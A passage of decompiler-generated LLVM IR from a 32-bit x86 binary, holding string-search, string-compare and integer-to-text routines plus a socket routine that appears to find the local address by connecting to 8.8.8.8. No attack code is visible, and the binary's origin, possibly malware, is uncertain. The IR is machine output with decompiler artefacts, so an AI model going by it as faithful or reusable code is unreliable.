  br i1 %v7_805282b, label %dec_label_pc_805282d, label %dec_label_pc_8052834

dec_label_pc_805282d:                             ; preds = %dec_label_pc_8052828
  %v1_805282d = load i32, i32* %esi.global-to-local, align 4
  %v3_805282d = add i32 %v1_805282d, %v0_8052834.pre
  %v4_805282d = inttoptr i32 %v3_805282d to i8*
  %v5_805282d = load i8, i8* %v4_805282d, align 1
  %v14_805282d = icmp eq i8 %v5_805282d, 10
  %v1_8052832 = icmp eq i1 %v14_805282d, false
  br i1 %v1_8052832, label %dec_label_pc_805282d.dec_label_pc_8052815_crit_edge, label %dec_label_pc_8052834

dec_label_pc_805282d.dec_label_pc_8052815_crit_edge: ; preds = %dec_label_pc_805282d
  %v0_805281c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052815

dec_label_pc_8052834:                             ; preds = %dec_label_pc_8052815, %dec_label_pc_8052828, %dec_label_pc_805282d
  %v0_8052834 = phi i32 [ %v1_8052828, %dec_label_pc_8052828 ], [ %v1_8052828, %dec_label_pc_805282d ], [ %v0_8052834.pre, %dec_label_pc_8052815 ]
  %v1_8052834 = icmp eq i32 %v0_8052834, 0
  %v1_8052836 = icmp eq i1 %v1_8052834, false
  %v0_8052843 = load i32, i32* %esi.global-to-local, align 4
  %v2_8052843 = select i1 %v1_8052836, i32 %v0_8052843, i32 0
  store i32 %v0_8052803, i32* @ebx, align 4
  store i32 %v0_8052801, i32* @edi, align 4
  ret i32 %v2_8052843

; uselistorder directives
  uselistorder i32 %v1_8052828, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052834.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8052825, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_8052d1c, { 1, 0 }
  uselistorder label %dec_label_pc_8052834, { 2, 1, 0 }
}

define i32 @function_8052850() local_unnamed_addr {
dec_label_pc_8052850:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_805285d = call i32 @function_80530b9(i32 16)
  %v1_8052862 = inttoptr i32 %v1_805285d to i32*
  store i32 0, i32* %v1_8052862, align 4
  %v3_805286f = call i32 @function_8053375(i32 2, i32 2, i32 0)
  store i32 %v3_805286f, i32* %esi.global-to-local, align 4
  %v10_805287b = icmp eq i32 %v3_805286f, -1
  br i1 %v10_805287b, label %dec_label_pc_80528c2, label %dec_label_pc_8052880

dec_label_pc_8052880:                             ; preds = %dec_label_pc_8052850
  %v2_8052880 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8052880, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_805289f = call i32 @function_805319a(i32 %v3_805286f, i32 %v2_8052880, i32 16)
  %v2_80528a7 = ptrtoint i32* %stack_var_-12 to i32
  %v0_80528ad = load i32, i32* %esi.global-to-local, align 4
  %v3_80528ae = call i32 @function_80531c5(i32 %v0_80528ad, i32 %v2_8052880, i32 %v2_80528a7)
  %v1_80528b6 = call i32 @function_8052b81(i32 %v0_80528ad)
  br label %dec_label_pc_80528c2

dec_label_pc_80528c2:                             ; preds = %dec_label_pc_8052850, %dec_label_pc_8052880
  %v0_80528c7 = phi i32 [ 0, %dec_label_pc_8052850 ], [ 134744072, %dec_label_pc_8052880 ]
  ret i32 %v0_80528c7

; uselistorder directives
  uselistorder i32 %v3_805286f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805319a, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8053375, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80528c2, { 1, 0 }
}

define i32 @function_80528d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80528d0:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_80528e2 = load i8, i8* %tmp18, align 1
  %v3_80528e2 = icmp eq i8 %v2_80528e2, 0
  br i1 %v3_80528e2, label %dec_label_pc_80528f8, label %dec_label_pc_80528e8

dec_label_pc_80528e8:                             ; preds = %dec_label_pc_80528d0, %dec_label_pc_80528e8
  %v2_80528e8 = phi i32 [ %v1_80528eb, %dec_label_pc_80528e8 ], [ 0, %dec_label_pc_80528d0 ]
  %v1_80528eb = add i32 %v2_80528e8, 1
  %v2_80528f2 = add i32 %v1_80528eb, %arg3
  %v3_80528f2 = inttoptr i32 %v2_80528f2 to i8*
  %v4_80528f2 = load i8, i8* %v3_80528f2, align 1
  %v5_80528f2 = icmp eq i8 %v4_80528f2, 0
  %v1_80528f6 = icmp eq i1 %v5_80528f2, false
  br i1 %v1_80528f6, label %dec_label_pc_80528e8, label %dec_label_pc_80528f8

dec_label_pc_80528f8:                             ; preds = %dec_label_pc_80528e8, %dec_label_pc_80528d0
  %v2_805292f = phi i32 [ 0, %dec_label_pc_80528d0 ], [ %v1_80528eb, %dec_label_pc_80528e8 ]
  %v4_80528fe = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_805292c, label %dec_label_pc_8052906.preheader

dec_label_pc_8052906.preheader:                   ; preds = %dec_label_pc_80528f8
  %v4_8052906.pre = load i32, i32* @ecx, align 4
  %v6_8052908.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052906

dec_label_pc_8052906:                             ; preds = %dec_label_pc_8052906.preheader, %dec_label_pc_8052927
  %v0_8052927 = phi i32 [ %arg2, %dec_label_pc_8052906.preheader ], [ %v1_8052927, %dec_label_pc_8052927 ]
  %v6_8052908 = phi i32 [ %v6_8052908.pre, %dec_label_pc_8052906.preheader ], [ %v2_8052921, %dec_label_pc_8052927 ]
  %v0_8052935 = phi i32 [ 0, %dec_label_pc_8052906.preheader ], [ %v1_80529088, %dec_label_pc_8052927 ]
  %v4_8052906 = phi i32 [ %v4_8052906.pre, %dec_label_pc_8052906.preheader ], [ %v0_8052921, %dec_label_pc_8052927 ]
  %v0_805290c = phi i32 [ %v4_80528fe, %dec_label_pc_8052906.preheader ], [ %v1_805290c, %dec_label_pc_8052927 ]
  %v1_8052906 = inttoptr i32 %v0_805290c to i8*
  %v2_8052906 = load i8, i8* %v1_8052906, align 1
  %v3_8052906 = zext i8 %v2_8052906 to i32
  %v5_8052906 = and i32 %v4_8052906, -256
  %v6_8052906 = or i32 %v3_8052906, %v5_8052906
  store i32 %v6_8052906, i32* @ecx, align 4
  %v2_8052908 = add i32 %v0_8052935, %arg3
  %v3_8052908 = inttoptr i32 %v2_8052908 to i8*
  %v4_8052908 = load i8, i8* %v3_8052908, align 1
  %v5_8052908 = zext i8 %v4_8052908 to i32
  %v7_8052908 = and i32 %v6_8052908, -256
  %v8_8052908 = or i32 %v5_8052908, %v7_8052908
  %v1_805290c = add i32 %v0_805290c, 1
  %v1_805290d = add i8 %v2_8052906, -65
  %v8_8052912 = icmp ugt i8 %v1_805290d, 25
  br i1 %v8_8052912, label %dec_label_pc_8052917, label %dec_label_pc_8052914

dec_label_pc_8052914:                             ; preds = %dec_label_pc_8052906
  %v1_8052914 = or i32 %v6_8052906, 96
  store i32 %v1_8052914, i32* @ecx, align 4
  br label %dec_label_pc_8052917

dec_label_pc_8052917:                             ; preds = %dec_label_pc_8052906, %dec_label_pc_8052914
  %v0_8052921 = phi i32 [ %v6_8052906, %dec_label_pc_8052906 ], [ %v1_8052914, %dec_label_pc_8052914 ]
  %v1_8052917 = add i8 %v4_8052908, -65
  %v8_805291c = icmp ugt i8 %v1_8052917, 25
  br i1 %v8_805291c, label %dec_label_pc_8052921, label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_8052917
  %v1_805291e = or i32 %v8_8052908, 96
  br label %dec_label_pc_8052921

dec_label_pc_8052921:                             ; preds = %dec_label_pc_8052917, %dec_label_pc_805291e
  %v2_8052921 = phi i32 [ %v8_8052908, %dec_label_pc_8052917 ], [ %v1_805291e, %dec_label_pc_805291e ]
  %v1_8052921 = trunc i32 %v0_8052921 to i8
  %v3_8052921 = trunc i32 %v2_8052921 to i8
  %v15_8052921 = icmp eq i8 %v1_8052921, %v3_8052921
  br i1 %v15_8052921, label %dec_label_pc_8052935, label %dec_label_pc_8052925

dec_label_pc_8052925:                             ; preds = %dec_label_pc_8052921
  br label %dec_label_pc_8052927

dec_label_pc_8052927:                             ; preds = %dec_label_pc_8052935, %dec_label_pc_8052925
  %v1_80529088 = phi i32 [ %v1_8052935, %dec_label_pc_8052935 ], [ 0, %dec_label_pc_8052925 ]
  %v1_8052927 = add i32 %v0_8052927, -1
  %tmp26 = icmp slt i32 %v1_8052927, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8052906, label %dec_label_pc_805292c

dec_label_pc_805292c:                             ; preds = %dec_label_pc_8052927, %dec_label_pc_80528f8
  store i32 %v2_805292f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8052935:                             ; preds = %dec_label_pc_8052921
  %v1_8052935 = add i32 %v0_8052935, 1
  %v14_8052936 = icmp eq i32 %v2_805292f, %v1_8052935
  %v1_8052939 = icmp eq i1 %v14_8052936, false
  br i1 %v1_8052939, label %dec_label_pc_8052927, label %dec_label_pc_805293b

dec_label_pc_805293b:                             ; preds = %dec_label_pc_8052935
  store i32 %v4_80528fe, i32* @ecx, align 4
  %v2_8052941 = sub i32 %v1_805290c, %v4_80528fe
  store i32 %v2_805292f, i32* @edx, align 4
  ret i32 %v2_8052941

; uselistorder directives
  uselistorder i32 %v1_8052927, { 1, 0 }
  uselistorder i32 %v0_8052935, { 1, 0 }
  uselistorder i32 %v4_80528fe, { 2, 1, 0 }
  uselistorder i32 %v2_805292f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052921, { 1, 0 }
  uselistorder label %dec_label_pc_8052917, { 1, 0 }
  uselistorder label %dec_label_pc_8052906, { 1, 0 }
  uselistorder label %dec_label_pc_80528e8, { 1, 0 }
}

define i32 @function_8052950() local_unnamed_addr {
dec_label_pc_8052950:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8052952 = ptrtoint i8* %tmp13 to i32
  %v4_8052958 = ptrtoint i8* %tmp to i32
  %v2_805295c = load i8, i8* %tmp13, align 1
  %v3_805295c = icmp eq i8 %v2_805295c, 0
  br i1 %v3_805295c, label %dec_label_pc_8052968, label %dec_label_pc_8052961

dec_label_pc_8052961:                             ; preds = %dec_label_pc_8052950, %dec_label_pc_8052961
  %v0_8052961 = phi i32 [ %v1_8052961, %dec_label_pc_8052961 ], [ 0, %dec_label_pc_8052950 ]
  %v1_8052961 = add i32 %v0_8052961, 1
  %v2_8052962 = add i32 %v1_8052961, %v4_8052952
  %v3_8052962 = inttoptr i32 %v2_8052962 to i8*
  %v4_8052962 = load i8, i8* %v3_8052962, align 1
  %v5_8052962 = icmp eq i8 %v4_8052962, 0
  %v1_8052966 = icmp eq i1 %v5_8052962, false
  br i1 %v1_8052966, label %dec_label_pc_8052961, label %dec_label_pc_8052968

dec_label_pc_8052968:                             ; preds = %dec_label_pc_8052961, %dec_label_pc_8052950
  %v0_8052979 = phi i32 [ 0, %dec_label_pc_8052950 ], [ %v1_8052961, %dec_label_pc_8052961 ]
  %v2_805296a = load i8, i8* %tmp, align 1
  %v3_805296a = icmp eq i8 %v2_805296a, 0
  br i1 %v3_805296a, label %dec_label_pc_8052977, label %dec_label_pc_8052970

dec_label_pc_8052970:                             ; preds = %dec_label_pc_8052968, %dec_label_pc_8052970
  %v0_8052970 = phi i32 [ %v1_8052970, %dec_label_pc_8052970 ], [ 0, %dec_label_pc_8052968 ]
  %v1_8052970 = add i32 %v0_8052970, 1
  %v2_8052971 = add i32 %v1_8052970, %v4_8052958
  %v3_8052971 = inttoptr i32 %v2_8052971 to i8*
  %v4_8052971 = load i8, i8* %v3_8052971, align 1
  %v5_8052971 = icmp eq i8 %v4_8052971, 0
  %v1_8052975 = icmp eq i1 %v5_8052971, false
  br i1 %v1_8052975, label %dec_label_pc_8052970, label %dec_label_pc_8052977

dec_label_pc_8052977:                             ; preds = %dec_label_pc_8052970, %dec_label_pc_8052968
  %v0_8052977 = phi i32 [ 0, %dec_label_pc_8052968 ], [ %v1_8052970, %dec_label_pc_8052970 ]
  store i32 %v0_8052977, i32* @edx, align 4
  %v12_8052979 = icmp eq i32 %v0_8052979, %v0_8052977
  br i1 %v12_8052979, label %dec_label_pc_8052984.preheader, label %dec_label_pc_805297d

dec_label_pc_8052984.preheader:                   ; preds = %dec_label_pc_8052977
  %v1_805298417 = add i32 %v0_8052979, -1
  store i32 %v1_805298417, i32* @edx, align 4
  %v10_805298518 = icmp eq i32 %v0_8052979, 0
  br i1 %v10_805298518, label %dec_label_pc_8052992, label %dec_label_pc_805298a

dec_label_pc_805297d:                             ; preds = %dec_label_pc_805298a, %dec_label_pc_8052977
  ret i32 0

dec_label_pc_8052982:                             ; preds = %dec_label_pc_805298a
  %v3_805298a = zext i8 %v2_805298a to i32
  %v5_805298a = and i32 %v4_805298a20, -256
  %v6_805298a = or i32 %v3_805298a, %v5_805298a
  %v1_8052982 = add i32 %v0_805298221, 1
  %v1_8052983 = add i32 %v0_805298319, 1
  %v1_8052984 = add i32 %v1_805298422, -1
  store i32 %v1_8052984, i32* @edx, align 4
  %v10_8052985 = icmp eq i32 %v1_805298422, 0
  br i1 %v10_8052985, label %dec_label_pc_8052992, label %dec_label_pc_805298a

dec_label_pc_805298a:                             ; preds = %dec_label_pc_8052984.preheader, %dec_label_pc_8052982
  %v1_805298422 = phi i32 [ %v1_8052984, %dec_label_pc_8052982 ], [ %v1_805298417, %dec_label_pc_8052984.preheader ]
  %v0_805298221 = phi i32 [ %v1_8052982, %dec_label_pc_8052982 ], [ %v4_8052952, %dec_label_pc_8052984.preheader ]
  %v4_805298a20 = phi i32 [ %v6_805298a, %dec_label_pc_8052982 ], [ %v0_8052979, %dec_label_pc_8052984.preheader ]
  %v0_805298319 = phi i32 [ %v1_8052983, %dec_label_pc_8052982 ], [ %v4_8052958, %dec_label_pc_8052984.preheader ]
  %v1_805298a = inttoptr i32 %v0_805298221 to i8*
  %v2_805298a = load i8, i8* %v1_805298a, align 1
  %v3_805298c = inttoptr i32 %v0_805298319 to i8*
  %v4_805298c = load i8, i8* %v3_805298c, align 1
  %v15_805298c = icmp eq i8 %v2_805298a, %v4_805298c
  br i1 %v15_805298c, label %dec_label_pc_8052982, label %dec_label_pc_805297d

dec_label_pc_8052992:                             ; preds = %dec_label_pc_8052982, %dec_label_pc_8052984.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_805298422, { 1, 0 }
  uselistorder i32 %v0_8052979, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805298a, { 1, 0 }
  uselistorder label %dec_label_pc_8052970, { 1, 0 }
  uselistorder label %dec_label_pc_8052961, { 1, 0 }
}

define i32 @function_80529a0() local_unnamed_addr {
dec_label_pc_80529a0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_80529a2 = ptrtoint i8* %tmp14 to i32
  %v4_80529a8 = ptrtoint i8* %tmp13 to i32
  %v2_80529b0 = load i8, i8* %tmp14, align 1
  %v3_80529b0 = icmp eq i8 %v2_80529b0, 0
  br i1 %v3_80529b0, label %dec_label_pc_80529bc, label %dec_label_pc_80529b5

dec_label_pc_80529b5:                             ; preds = %dec_label_pc_80529a0, %dec_label_pc_80529b5
  %v0_80529b5 = phi i32 [ %v1_80529b5, %dec_label_pc_80529b5 ], [ 0, %dec_label_pc_80529a0 ]
  %v1_80529b5 = add i32 %v0_80529b5, 1
  %v2_80529b6 = add i32 %v1_80529b5, %v4_80529a2
  %v3_80529b6 = inttoptr i32 %v2_80529b6 to i8*
  %v4_80529b6 = load i8, i8* %v3_80529b6, align 1
  %v5_80529b6 = icmp eq i8 %v4_80529b6, 0
  %v1_80529ba = icmp eq i1 %v5_80529b6, false
  br i1 %v1_80529ba, label %dec_label_pc_80529b5, label %dec_label_pc_80529bc

dec_label_pc_80529bc:                             ; preds = %dec_label_pc_80529b5, %dec_label_pc_80529a0
  %v1_80529ca = phi i32 [ 0, %dec_label_pc_80529a0 ], [ %v1_80529b5, %dec_label_pc_80529b5 ]
  %v2_80529be = load i8, i8* %tmp13, align 1
  %v3_80529be = icmp eq i8 %v2_80529be, 0
  br i1 %v3_80529be, label %dec_label_pc_80529ca, label %dec_label_pc_80529c3

dec_label_pc_80529c3:                             ; preds = %dec_label_pc_80529bc, %dec_label_pc_80529c3
  %v0_80529c3 = phi i32 [ %v1_80529c3, %dec_label_pc_80529c3 ], [ 0, %dec_label_pc_80529bc ]
  %v1_80529c3 = add i32 %v0_80529c3, 1
  %v2_80529c4 = add i32 %v1_80529c3, %v4_80529a8
  %v3_80529c4 = inttoptr i32 %v2_80529c4 to i8*
  %v4_80529c4 = load i8, i8* %v3_80529c4, align 1
  %v5_80529c4 = icmp eq i8 %v4_80529c4, 0
  %v1_80529c8 = icmp eq i1 %v5_80529c4, false
  br i1 %v1_80529c8, label %dec_label_pc_80529c3, label %dec_label_pc_80529ca

dec_label_pc_80529ca:                             ; preds = %dec_label_pc_80529c3, %dec_label_pc_80529bc
  %v1_80529ce = phi i32 [ 0, %dec_label_pc_80529bc ], [ %v1_80529c3, %dec_label_pc_80529c3 ]
  %v8_80529cc = icmp sgt i32 %tmp, %v1_80529ca
  br i1 %v8_80529cc, label %dec_label_pc_80529d2, label %dec_label_pc_80529ce

dec_label_pc_80529ce:                             ; preds = %dec_label_pc_80529ca
  %v7_80529d0 = icmp sgt i32 %tmp, %v1_80529ce
  br i1 %v7_80529d0, label %dec_label_pc_80529d2, label %dec_label_pc_80529d9.preheader

dec_label_pc_80529d9.preheader:                   ; preds = %dec_label_pc_80529ce
  %v10_80529da19 = icmp eq i32 %tmp, 0
  br i1 %v10_80529da19, label %dec_label_pc_80529d4, label %dec_label_pc_80529df

dec_label_pc_80529d2:                             ; preds = %dec_label_pc_80529df, %dec_label_pc_80529ce, %dec_label_pc_80529ca
  br label %dec_label_pc_80529d4

dec_label_pc_80529d4:                             ; preds = %dec_label_pc_80529d9.preheader, %dec_label_pc_80529d7, %dec_label_pc_80529d2
  %storemerge = phi i32 [ 0, %dec_label_pc_80529d2 ], [ 1, %dec_label_pc_80529d7 ], [ 1, %dec_label_pc_80529d9.preheader ]
  ret i32 %storemerge

dec_label_pc_80529d7:                             ; preds = %dec_label_pc_80529df
  %v3_80529df = zext i8 %v2_80529df to i32
  %v5_80529df = and i32 %v4_80529df21, -256
  %v6_80529df = or i32 %v3_80529df, %v5_80529df
  %v1_80529d7 = add i32 %v0_80529d722, 1
  %v1_80529d8 = add i32 %v0_80529d820, 1
  %v10_80529da = icmp eq i32 %v1_80529d923, 0
  br i1 %v10_80529da, label %dec_label_pc_80529d4, label %dec_label_pc_80529df

dec_label_pc_80529df:                             ; preds = %dec_label_pc_80529d9.preheader, %dec_label_pc_80529d7
  %v1_80529d923.in = phi i32 [ %v1_80529d923, %dec_label_pc_80529d7 ], [ %tmp, %dec_label_pc_80529d9.preheader ]
  %v0_80529d722 = phi i32 [ %v1_80529d7, %dec_label_pc_80529d7 ], [ %v4_80529a2, %dec_label_pc_80529d9.preheader ]
  %v4_80529df21 = phi i32 [ %v6_80529df, %dec_label_pc_80529d7 ], [ %v1_80529ce, %dec_label_pc_80529d9.preheader ]
  %v0_80529d820 = phi i32 [ %v1_80529d8, %dec_label_pc_80529d7 ], [ %v4_80529a8, %dec_label_pc_80529d9.preheader ]
  %v1_80529d923 = add i32 %v1_80529d923.in, -1
  %v1_80529df = inttoptr i32 %v0_80529d722 to i8*
  %v2_80529df = load i8, i8* %v1_80529df, align 1
  %v3_80529e1 = inttoptr i32 %v0_80529d820 to i8*
  %v4_80529e1 = load i8, i8* %v3_80529e1, align 1
  %v15_80529e1 = icmp eq i8 %v2_80529df, %v4_80529e1
  br i1 %v15_80529e1, label %dec_label_pc_80529d7, label %dec_label_pc_80529d2

; uselistorder directives
  uselistorder label %dec_label_pc_80529df, { 1, 0 }
  uselistorder label %dec_label_pc_80529d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80529c3, { 1, 0 }
  uselistorder label %dec_label_pc_80529b5, { 1, 0 }
}

define i32 @function_80529f0(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80529f0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_80529f4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_80529fb = trunc i64 %arg1 to i32
  store i32 %v4_80529fb, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8052a03 = icmp eq i32 %arg3, 0
  br i1 %v2_8052a03, label %dec_label_pc_8052a70, label %dec_label_pc_8052a07

dec_label_pc_8052a07:                             ; preds = %dec_label_pc_80529f0
  %v2_8052a07 = icmp eq i32 %v4_80529fb, 0
  %v3_8052a07 = icmp slt i32 %v4_80529fb, 0
  br i1 %v2_8052a07, label %dec_label_pc_8052a80, label %dec_label_pc_8052a0b

dec_label_pc_8052a0b:                             ; preds = %dec_label_pc_8052a07
  %v9_8052a10 = icmp eq i32 %arg2, 10
  br i1 %v9_8052a10, label %dec_label_pc_8052a9d, label %dec_label_pc_8052a19

dec_label_pc_8052a19:                             ; preds = %dec_label_pc_8052a9d, %dec_label_pc_8052a0b
  br label %dec_label_pc_8052a1d

dec_label_pc_8052a1d:                             ; preds = %dec_label_pc_8052aa5, %dec_label_pc_8052a19
  %storemerge35 = phi i32 [ %v4_80529fb, %dec_label_pc_8052a19 ], [ %v1_8052aa7, %dec_label_pc_8052aa5 ]
  %v0_8052a245 = phi i32 [ %v4_80529fb, %dec_label_pc_8052a19 ], [ %v1_8052aa7, %dec_label_pc_8052aa5 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8052a19 ], [ 1, %dec_label_pc_8052aa5 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a22

dec_label_pc_8052a22:                             ; preds = %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge, %dec_label_pc_8052a1d
  %v2_8052a33 = phi i32 [ %v2_8052a33.pre, %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge ], [ %v12_80529f4, %dec_label_pc_8052a1d ]
  %v3_8052a33 = phi i32 [ %v1_8052a3b, %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge ], [ 32, %dec_label_pc_8052a1d ]
  %v0_8052a26 = phi i32 [ %v0_8052a3c, %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge ], [ %arg2, %dec_label_pc_8052a1d ]
  %v0_8052a24 = phi i32 [ %div20, %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge ], [ %v0_8052a245, %dec_label_pc_8052a1d ]
  %tmp32 = urem i32 %v0_8052a24, %v0_8052a26
  %v7_8052a2e = icmp sgt i32 %tmp32, 9
  %v1_8052a30.v1_8052a2b.v = select i1 %v7_8052a2e, i32 55, i32 48
  %v1_8052a30.v1_8052a2b = add i32 %v1_8052a30.v1_8052a2b.v, %tmp32
  %v1_8052a33 = trunc i32 %v1_8052a30.v1_8052a2b to i8
  %v4_8052a33 = add i32 %v3_8052a33, 14
  %v5_8052a33 = add i32 %v4_8052a33, %v2_8052a33
  %v6_8052a33 = inttoptr i32 %v5_8052a33 to i8*
  store i8 %v1_8052a33, i8* %v6_8052a33, align 1
  %v0_8052a39 = load i32, i32* %ecx.global-to-local, align 4
  %v0_8052a3b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052a3b = add i32 %v0_8052a3b, -1
  store i32 %v1_8052a3b, i32* %ebx.global-to-local, align 4
  %v0_8052a3c = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_8052a39, %v0_8052a3c
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_8052a39, %v0_8052a3c
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_8052a40 = icmp ugt i32 %v0_8052a3c, %v0_8052a39
  %v1_8052a42 = icmp eq i1 %v1_8052a40, false
  br i1 %v1_8052a42, label %dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge, label %dec_label_pc_8052a44

dec_label_pc_8052a22.dec_label_pc_8052a22_crit_edge: ; preds = %dec_label_pc_8052a22
  %v2_8052a33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a22

dec_label_pc_8052a44:                             ; preds = %dec_label_pc_8052a22
  %v0_8052a44 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052a44 = icmp eq i32 %v0_8052a44, 0
  %v1_8052a46 = icmp eq i1 %v1_8052a44, false
  br i1 %v1_8052a46, label %dec_label_pc_8052a96, label %dec_label_pc_8052a48

dec_label_pc_8052a48:                             ; preds = %dec_label_pc_8052a44
  store i32 %v0_8052a3b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a49

dec_label_pc_8052a49:                             ; preds = %dec_label_pc_8052a96, %dec_label_pc_8052a48
  %v1_8052a49 = phi i32 [ %v1_8052a49.pre, %dec_label_pc_8052a96 ], [ %v0_8052a3b, %dec_label_pc_8052a48 ]
  %v0_8052a49 = load i32, i32* @esp, align 4
  %v2_8052a49 = add i32 %v1_8052a49, 14
  %v3_8052a49 = add i32 %v2_8052a49, %v0_8052a49
  store i32 %v3_8052a49, i32* %eax.global-to-local, align 4
  %v1_8052a4d = inttoptr i32 %v3_8052a49 to i8*
  %v2_8052a4d = load i8, i8* %v1_8052a4d, align 1
  %v3_8052a4d = icmp eq i8 %v2_8052a4d, 0
  br i1 %v3_8052a4d, label %dec_label_pc_8052ab5, label %dec_label_pc_8052a52

dec_label_pc_8052a52:                             ; preds = %dec_label_pc_8052a49
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052a54

dec_label_pc_8052a54:                             ; preds = %dec_label_pc_8052a54, %dec_label_pc_8052a52
  %v0_8052a54 = phi i32 [ %v1_8052a54, %dec_label_pc_8052a54 ], [ 0, %dec_label_pc_8052a52 ]
  %v1_8052a54 = add i32 %v0_8052a54, 1
  store i32 %v1_8052a54, i32* %ecx.global-to-local, align 4
  %v2_8052a55 = add i32 %v1_8052a54, %v3_8052a49
  %v3_8052a55 = inttoptr i32 %v2_8052a55 to i8*
  %v4_8052a55 = load i8, i8* %v3_8052a55, align 1
  %v5_8052a55 = icmp eq i8 %v4_8052a55, 0
  %v1_8052a59 = icmp eq i1 %v5_8052a55, false
  br i1 %v1_8052a59, label %dec_label_pc_8052a54, label %dec_label_pc_8052a5b

dec_label_pc_8052a5b:                             ; preds = %dec_label_pc_8052a54
  %v10_8052a5b = icmp eq i32 %v0_8052a54, -2
  br i1 %v10_8052a5b, label %dec_label_pc_8052a70, label %dec_label_pc_8052a60

dec_label_pc_8052a60:                             ; preds = %dec_label_pc_8052a5b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052a49, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052a64

dec_label_pc_8052a64:                             ; preds = %dec_label_pc_8052ab5, %dec_label_pc_8052a60, %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge
  %v2_8052a67 = phi i32 [ %v1_8052a6a, %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge ], [ %arg3, %dec_label_pc_8052a60 ], [ %arg3, %dec_label_pc_8052ab5 ]
  %v0_8052a66 = phi i32 [ %v0_8052a6b, %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge ], [ %v1_8052a54, %dec_label_pc_8052a60 ], [ 0, %dec_label_pc_8052ab5 ]
  %v4_8052a64 = phi i32 [ %v4_8052a64.pre, %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge ], [ %v3_8052a49, %dec_label_pc_8052a60 ], [ %v3_8052a49, %dec_label_pc_8052ab5 ]
  %v0_8052a64 = phi i32 [ %v1_8052a69, %dec_label_pc_8052a64.dec_label_pc_8052a64_crit_edge ], [ %v3_8052a49, %dec_label_pc_8052a60 ], [ %v3_8052a49, %dec_label_pc_8052ab5 ]
  %v1_8052a64 = inttoptr i32 %v0_8052a64 to i8*
  %v2_8052a64 = load i8, i8* %v1_8052a64, align 1
  %v3_8052a64 = zext i8 %v2_8052a64 to i32
  %v5_8052a64 = and i32 %v4_8052a64, -256
  %v6_8052a64 = or i32 %v3_8052a64, %v5_8052a64
  store i32 %v6_8052a64, i32* %eax.global-to-local, align 4
  %v1_8052a66 = add i32 %v0_8052a66, -1
  store i32 %v1_8052a66, i32* %ecx.global-to-local, align 4
  %v3_8052a67 = inttoptr i32 %v2_8052a67 to i8*
  store i8 %v2_8052a64, i8* %v3_8052a67, align 1
  %v0_8052a69 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a69 = add i32 %v0_8052a69, 1
  store i32 %v1_8052a69, i32* %edx.global-to-local, align 4
